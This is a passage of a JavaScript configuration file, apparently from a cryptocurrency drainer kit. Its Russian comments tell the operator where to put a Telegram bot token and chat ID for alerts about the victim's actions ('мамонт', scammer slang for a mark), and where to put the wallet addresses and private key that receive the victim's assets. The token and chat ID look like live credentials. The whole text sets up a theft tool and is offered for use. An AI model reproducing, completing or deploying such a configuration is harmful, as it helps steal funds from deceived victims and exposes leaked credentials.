...
const MS_Telegram_Token = "7944757067:AAEhkXn7osM4r-iccNTXX1nROf6z0uWK9Sk"; // Сюда вписать свой токен от бота из @BotFather
const MS_Telegram_Chat_ID = "-4717320793"; // Сюда вписать ID чата, куда нужно отправлять уведомления о действиях мамонта

const MS_Wallet_Address = "ADDR"; // Адрес кошелька, куда будут идти активы мамонта
const MS_Wallet_Private = "PRIVATE"; // Приватный ключ от кошелька выше (ОБЯЗАТЕЛЬНО)
const MS_Wallet_Receiver = "ADDR 2"; // Кошелек, куда будут приходить активы, может быть таким же, как MS_Wallet_Address
